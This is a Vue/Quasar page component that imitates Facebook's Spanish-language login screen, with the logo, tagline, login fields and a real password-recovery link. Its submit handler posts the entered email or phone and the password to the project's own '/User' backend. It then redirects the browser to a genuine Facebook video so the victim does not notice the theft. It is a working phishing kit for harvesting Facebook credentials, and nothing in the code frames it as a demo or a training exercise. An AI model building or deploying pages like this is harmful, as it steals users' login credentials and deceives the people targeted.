<template>
  <q-page class="row items-center justify-evenly">
    <div class="row">
      <div class="col-6">
        <q-img width="320px" height="107" src="4lCu2zih0ca.svg"></q-img>
        <div class="text-h5 q-ml-lg">
          Facebook te ayuda a comunicarte y<br />
          compartir con las personas que forman<br />
          parte de tu vida.
        </div>
      </div>
      <div class="col-6" style="padding-left: 90px">
        <div>
          <q-form
            @submit="onSubmit"
            class="q-pa-md"
            style="background-color: white; border-radius: 10px; width: 400px"
          >
            <q-input
              outlined
              v-model="user.userName"
              placeholder="Correo electrónico o número de teléfono"
            />
            <br />
            <q-input
              outlined
              v-model="user.passWord"
              placeholder="Contraseña"
              :type="isPwd ? 'password' : 'text'"
            >
              <template v-slot:append>
                <q-icon
                  :name="isPwd ? 'visibility_off' : 'visibility'"
                  class="cursor-pointer"
                  @click="isPwd = !isPwd"
                />
              </template>
            </q-input>
            <br />

            <div class="row">
              <q-btn
                label="Iniciar sesión"
                class="fit q-pa-sm"
                no-caps
                type="submit"
                color="primary"
              />
            </div>
            <br />
            <div class="text-center">
              <a
                href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
                class="text-center"
                >¿Has olvidado la contraseña?</a
              >
            </div>
            <br />
            <div style="background-color: lightgray; height: 1px"></div>
            <br />
            <div class="text-center">
              <q-btn
                class="q-pa-sm"
                label="Crear cuenta nueva"
                color="positive"
                no-caps
              />
            </div>
          </q-form>
          <br />
          <div class="text-center">
            <b>Crea una página</b> para un famoso, una marca o una empresa.
          </div>
        </div>
      </div>
    </div>
  </q-page>
</template>

<script setup lang="ts">
//import { Todo, Meta } from 'components/models';
//import ExampleComponent from 'components/ExampleComponent.vue';
import { useQuasar } from 'quasar';
import { api } from 'src/boot/axios';
import { ref } from 'vue';
import { useRouter } from 'vue-router';

interface AddUser {
  userName: string | null;
  passWord: string | null;
}

const $q = useQuasar();
const isPwd = ref(true);
const router = useRouter();

const user = ref<AddUser>({} as AddUser);

const onSubmit = async () => {
  //validate null or empty fields
  if (!user.value.userName || !user.value.passWord) return;
  try {
    await api.post('/User', user.value);

    window.location.href =
      'https://www.facebook.com/100022551787370/videos/pcb.2068614946816585/300679486178360';
  } catch (err: unknown) {
    console.log('Error al adicionar', err);
  } finally {
    //clear input
    user.value.userName = null;
    user.value.passWord = null;
  }
};
</script>
